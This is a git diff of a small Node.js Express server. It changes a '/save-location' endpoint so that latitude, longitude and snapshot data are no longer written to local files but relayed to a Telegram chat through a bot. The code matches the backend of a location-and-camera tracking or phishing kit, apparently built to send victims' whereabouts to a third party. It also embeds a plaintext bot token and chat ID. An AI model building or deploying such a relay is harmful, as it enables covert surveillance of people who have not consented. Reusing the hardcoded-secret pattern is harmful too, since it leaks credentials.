@@ -1,41 +1,47 @@
-const express = require('express');
-const fs = require('fs');
-const path = require('path');
+const express = require("express");
+const fetch = require("node-fetch");
+const bodyParser = require("body-parser");
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+app.use(bodyParser.json());
 
-// Middleware to parse JSON data
-app.use(express.json());
+const botToken = "7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds";
+const chatId = "868517021";  // Your Chat ID
 
-// Directory to store snapshots and locations
-const dataDir = path.join(__dirname, 'data');
-if (!fs.existsSync(dataDir)) {
-    fs.mkdirSync(dataDir);
+// Function to send messages to Telegram
+function sendToTelegram(message) {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log("Message sent to Telegram:", data);
+    })
+    .catch(error => {
+        console.error("Error sending message:", error);
+    });
 }
 
-// POST endpoint to save location and snapshot
-app.post('/save-location', (req, res) => {
+// Endpoint to receive location and snapshot data
+app.post("/save-location", (req, res) => {
     const { latitude, longitude, snapshot } = req.body;
+    console.log("Received Data:", { latitude, longitude, snapshot });
 
-    // Create a timestamped file name
-    const timestamp = Date.now();
+    const message = `Location: Latitude ${latitude}, Longitude ${longitude}\nSnapshot: ${snapshot ? "Snapshot available" : "No snapshot"}`;
+    sendToTelegram(message);  // Send location and snapshot to Telegram
 
-    // Save location data
-    const locationData = `Timestamp: ${new Date().toLocaleString()}\nLatitude: ${latitude}, Longitude: ${longitude}\n\n`;
-    fs.appendFileSync(path.join(dataDir, 'locations.txt'), locationData);
-
-    // Save the snapshot as a PNG image
-    if (snapshot && snapshot.startsWith('data:image/png;base64,')) {
-        const base64Data = snapshot.replace(/^data:image\/png;base64,/, '');
-        fs.writeFileSync(path.join(dataDir, `snapshot_${timestamp}.png`), base64Data, 'base64');
-    }
-
-    console.log("Data saved successfully.");
-    res.status(200).send('Location and snapshot saved.');
+    res.status(200).send("Data received and sent to Telegram");
 });
 
 // Start the server
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
